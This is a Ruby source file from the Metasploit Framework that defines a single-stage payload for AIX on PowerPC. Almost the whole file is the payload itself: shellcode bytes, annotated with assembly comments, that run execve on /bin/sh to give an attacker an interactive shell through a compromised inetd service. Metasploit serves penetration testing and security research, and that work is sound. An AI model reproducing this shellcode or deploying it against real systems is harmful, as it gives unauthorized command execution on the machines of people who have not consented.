##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/find_shell'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Aix
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'AIX execve shell for inetd',
      'Description'   => 'Simply execve /bin/sh (for inetd programs)',
      'Author'        => 'jduck',
      'License'       => MSF_LICENSE,
      'Platform'      => 'aix',
      'Arch'          => ARCH_PPC,
      'PayloadType'   => 'cmd_interact',
      'Handler'       => Msf::Handler::FindShell,
      'Session'       => Msf::Sessions::CommandShell
    ))

  end

  def generate(*args)
    super(*args)

    payload =
      "\x7c\xa5\x2a\x79"     +# /* xor.    r5,r5,r5             */
      "\x40\x82\xff\xfd"     +# /* bnel    <shellcode>          */
      "\x7f\xe8\x02\xa6"     +# /* mflr    r31                  */
      "\x3b\xff\x01\x20"     +# /* cal     r31,0x120(r31)       */
      "\x38\x7f\xff\x08"     +# /* cal     r3,-248(r31)         */
      "\x38\x9f\xff\x10"     +# /* cal     r4,-240(r31)         */
      "\x90\x7f\xff\x10"     +# /* st      r3,-240(r31)         */
      "\x90\xbf\xff\x14"     +# /* st      r5,-236(r31)         */
      "\x88\x5f\xff\x0f"     +# /* lbz     r2,-241(r31)         */
      "\x98\xbf\xff\x0f"     +# /* stb     r5,-241(r31)         */
      "\x4c\xc6\x33\x42"     +# /* crorc   cr6,cr6,cr6          */
      "\x44\xff\xff\x02"     +# /* svca                         */
      "/bin/sh"+
      "\x05"

  end

end
